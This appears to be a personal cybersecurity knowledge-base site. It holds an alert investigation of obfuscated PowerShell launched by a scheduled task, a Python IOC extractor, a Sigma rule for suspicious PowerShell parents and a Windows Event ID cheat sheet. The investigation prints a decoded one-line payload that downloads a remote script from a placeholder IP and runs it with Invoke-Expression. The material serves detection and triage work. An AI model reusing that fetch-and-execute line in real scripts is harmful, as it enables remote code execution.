docs.title: Home
docs.text:
Learn. Test. Investigate. Document. Privacy Skill Vault

Privacy Skill Vault is a personal technical knowledge base built from the things I learn, test, investigate, troubleshoot, and document over time.

It is not intended to be a definitive cybersecurity reference, and it is not presented as one.

The goal is to keep useful technical notes, document findings and problem-solving, and create a record of things that are worth revisiting.

SIMULATED SECURITY EVENT MONITOR Why I built this I use it to keep the things I find useful, along with the notes, findings, examples, and lessons that I want to be able to come back to later.

I come across useful things while working, troubleshooting, testing tools, reading documentation, researching, or simply trying to understand how something works.

The difficult part is remembering all of it. Something can make perfect sense when I read it, only to become difficult to find or remember later. Different sources can also explain the same topic differently, and what works in one environment may not always work in another.

Some of the content comes from things I have worked with directly. Other parts come from research, documentation, experiments, investigations, or information gathered from different sources.

The goal is not to present everything here as something I discovered myself. It is simply a place to keep what I learn, document useful findings, and make them easier to understand and refer back to.

What You'll Find Here

Privacy Skill Vault brings together the things I learn, investigate, test, and find useful across cybersecurity and technology.

🔎 Investigations

Real-world security investigations and technical problems that require more than a quick fix.

These pages document the problem, what was investigated, the evidence and observations along the way, and the findings where they can be established.

🧪 Labs & Testing

Hands-on work exploring security technologies, configurations, attack techniques, and defensive approaches.

The labs cover both offensive and defensive security, with practical testing used to understand how things actually behave rather than relying only on theory.

🛠️ Tools

A collection of security tools and practical utilities that are useful for investigation, analysis, testing, and day-to-day security work.

Where possible, the focus is on what a tool does, how it can be used, and what its results actually tell you.

📚 Learning

Practical learning material covering areas such as SOC operations, penetration testing, cyber fraud, security concepts, and the technologies behind them.

The aim is to turn useful information into something that is easier to understand, practice, and return to later.

📝 Blog

A place for security research, observations, technical write-ups, and topics that are worth exploring in more detail.

Not every post is meant to be a definitive answer. Some are simply the result of looking into a question and documenting what was found.

💡 Findings & Lessons

Small details, unexpected behaviour, mistakes, limitations, and useful observations that are easy to overlook but worth remembering.

Sometimes the most useful outcome is not a major discovery, but simply understanding why something happened or correcting an assumption.

Latest Investigations & Lab Reports

Explore recent breakdowns of alert investigations, detection engineering notes, and security lab guides.

SIEM INVESTIGATION Investigating Privilege Escalation via Token Manipulation May 18, 2026 • 12 min read → DETECTION ENGINEERING Reducing False Positives in Windows Logon Alerts May 12, 2026 • 10 min read → LAB GUIDE Building a Detection Lab with pfSense, Suricata & Elastic May 7, 2026 • 15 min read → START EXPLORING

There is no particular order to follow.

You can start with an investigation, browse through the technical notes, explore privacy and security topics, or simply see what has been added recently.

If you find something useful, use it. If something doesn't look right, question it. And if something here gives you a useful starting point for your own investigation, then it is serving its purpose.

docs.title: Investigating Obfuscated PowerShell Execution via Scheduled Tasks         1. Incident Trigger & Initial Context                3. Investigation & Triage Workflow                2. Telemetry & Log Evidence                4. Root Cause & Detection Tuning
docs.text:
Severity: Medium Status: Closed / Resolved Category: Host Telemetry & SIEM
  • Alert Name: SUSPICIOUS_POWERSHELL_BASE64_EXEC
  • Trigger Source: Windows Security Event Log (Event ID 4688) on endpoint HOST-FIN-02.
  • Initial Observation: An automated SIEM alert flagged an obfuscated PowerShell command executing under the SYSTEM account outside standard maintenance hours.
  1. Payload Decoding: Extracted the Base64 string from Sysmon Event ID 1 and decoded the payload using CyberChef to identify the outbound destination.
  2. Parent-Child Process Analysis: Verified that powershell.exe was spawned directly by taskeng.exe (Windows Scheduled Tasks Engine), confirming automated persistence rather than interactive execution.
  3. Network Telemetry Correlation: Cross-referenced network firewall logs for outbound connections to 192.0.2.45. Identified 12 outbound connection attempts within a 3-minute window.
  4. Host Verification: Interviewed the system administration team and checked local task scheduler definitions. Confirmed an unannounced legacy maintenance script was executing without updated service account encapsulation.

Sysmon Event ID 1 (Process Creation):

UtcTime: 2026-07-12 02:14:08.112
ProcessId: 4820
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -NoP -NonI -W Hidden -e aXdX... [Base64 Truncated]
ParentImage: C:\Windows\System32\taskeng.exe
User: NT AUTHORITY\SYSTEM

Script Block Logging (Windows Event ID 4104) Decoded Payload:

$cli = New-Object System.Net.WebClient
$data = $cli.DownloadString('http://192.0.2.45/stage2.ps1')
Invoke-Expression $data

Verdict: Authorized Administrator Misconfiguration (True Positive for policy violation, False Positive for active malware).

Remediation & Detection Tuning:
  • Reconfigured the admin task to run via a dedicated service account with restricted privileges.
  • Updated the SIEM detection rule to alert specifically on unquoted administrative script paths while keeping base-64 PowerShell flags flagged for non-standard parent processes.

Explore the Investigations Vault →

docs.title: Tool 1: Log Parser & IOC Extractor (log_parser.py)
docs.text:
• Category: Python Utility
  • Target: Web / WAF Logs
  • Use Case: IOC Extraction
import re
import sys

def extract_iocs(log_line):
    ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', log_line)
    urls = re.findall(r'https?://[^\s]+', log_line)
    hashes = re.findall(r'\b[a-fA-F0-9]{32,64}\b', log_line)
    return {
        "ips": ips,
        "urls": urls,
        "hashes": hashes
    }

def parse_log_file(path):
    try:
        with open(path, "r", errors="ignore") as f:
            for line in f:
                iocs = extract_iocs(line)
                if any(iocs.values()):
                    print(iocs)
    except FileNotFoundError:
        print(f"File not found: {path}")
    except OSError as exc:
        print(f"Error reading log file: {exc}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 log_parser.py <path_to_log_file>")
    else:
        parse_log_file(sys.argv[1])

docs.title: Tool 2: Sigma Rule — Suspicious PowerShell Parent Process
docs.text:
• Category: Sigma Rule
  • Target: Windows Event 4688 / Sysmon 1
  • Status: Active
title: Suspicious PowerShell Child Process Execution
id: f38a29a1-7e82-4c22-b98a-112233445566
status: experimental
description: Detects powershell.exe being spawned by unexpected parent processes like Microsoft Office, MSHTA, or WMI.
author: Privacy Skill Vault
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\mshta.exe'
            - '\wmiprvse.exe'
    condition: selection
falsepositives:
    - Custom administrative automation scripts (verify parent path)
level: high
tags:
    - attack.execution
    - attack.t1059.001

docs.title: Cheat Sheet A: Essential Windows Event IDs for SOC Analysts
docs.text: Event ID Provider / Log Source Description & Triage Focus 4624 Security Successful Logon (Check Logon Type 3 for Network, 10 for RDP) 4625 Security Failed Logon Attempt (Brute-force / Credential Stuffing indicator) 4688 Security New Process Created (Inspect command line flags and parent process) 4720 Security A user account was created (Check for unauthorized privilege escalation) 4104 PowerShell / Operational Script Block Logging (Contains raw, un-obfuscated script code) 1 Sysmon Process Creation (Includes File Hashes, Parent Command Line, User) 3 Sysmon Network Connection (Binds process ID to destination IP and Port)
